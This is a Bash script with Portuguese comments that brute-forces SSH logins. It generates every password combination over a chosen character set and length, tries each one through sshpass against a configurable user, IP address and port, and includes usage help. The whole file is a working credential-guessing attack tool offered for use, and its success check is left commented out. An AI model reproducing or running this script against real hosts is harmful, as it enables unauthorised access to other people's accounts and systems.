#!/bin/bash
# [brute.sh]
# Developed by Guizith

#Este eh um script de brute force em ssh
#Para uso eh necessario utilizar o pacote SSHPASS
#~sudo apt-get install sshpass~

# Vetor
VETORNUM=

#Base, default=3
R=3

#Usuario de ssh
USRR='gui'
#Ip de ssh
IPADD=10.0.1.22
#Porta de ssh
PORTT=2222

#Universo de simbolos a ser utilizados na senha
UNIVERSO=
 
# Universos default.
U1='abcdefghijklmnopqrstuvwxyz'
U2='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
U3='0123456789'
 
function help_me {
echo ' '
echo '=----------------> How to Use <----------------='
echo ' Permission Required: chmod 755 brute.sh'
echo './brute.sh [options]'
echo ''
echo '~~Type:'
echo '-h             This Help.'
echo '-u             User.'
echo '-i             Ip Address.'
echo '-p             Acess Port (Default:22).'
echo '-a             [a-z].'
echo '-A             [A-Z].'
echo '-d             [0-9].'
echo '-c <Universe>  Customize.'
echo '-r <length>    Size (Default: '$R').'
echo ' '
echo 'Developed by Guizith.'
echo ' '
exit 1
}
 
# Comando sem opcoes.
[ "$1" ] || help_me
 

#Tratamento de linha de comando.
while getopts 'u:i:p:haAdc:r' OPT
do
    
     case $OPT in
        "h") help_me; exit ;;
	"u") USRR=${OPTARG};;
	"i") IPADD=${OPTARG};;
	"p") PORTT=${OPTARG};;
	"a") UNIVERSO=${ALFABETO}${U1} ;;
        "A") UNIVERSO=${ALFABETO}${U2} ;;
        "d") UNIVERSO=${ALFABETO}${U3} ;;
        "c") UNIVERSO=${ALFABETO}${OPTARG} ;;
        "r") R=${OPTARG} ;;
        "?") echo 'Opcao invalida: '$OPT;
             echo 'Digite '$0' -h para mais ajuda.' ;
             exit 1 ;;
    esac
done

# Caso nao forneca nenhum simbolo
[ -z "$UNIVERSO" ] && echo 'Sem simbolos a serem processados.' && exit 1
 
# size
N=${#UNIVERSO}
 
while [ -z ${VETORNUM[R]} ]
do
    #loop de tentativas
    TRY=
    for (( i=0; i < R; i++ ))
    do
        index=${VETORNUM[i]}
        TRY=${UNIVERSO:index:1}${TRY}
    done
 

    # Mostra a saida e tenta conexao com ssh
    echo '~Tentando conexão com a senha:' $TRY
    sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT
    
#Saida do brute force caso obtenha acesso no sshpass
   # if [ "$acc" = "0" ]
    #then
	   # echo 'valor de acc' $acc
     #       exit
 #   fi


    # Incrementa a primeira posicao.
    let VETORNUM[0]++
 
    # Carry.
    for (( i=0; i < R; i++ ))
    do
        if [ "${VETORNUM[i]}" = "$N" ]
        then
            VETORNUM[i]=0 ;
            let VETORNUM[i+1]++ ;
        fi
    done
done
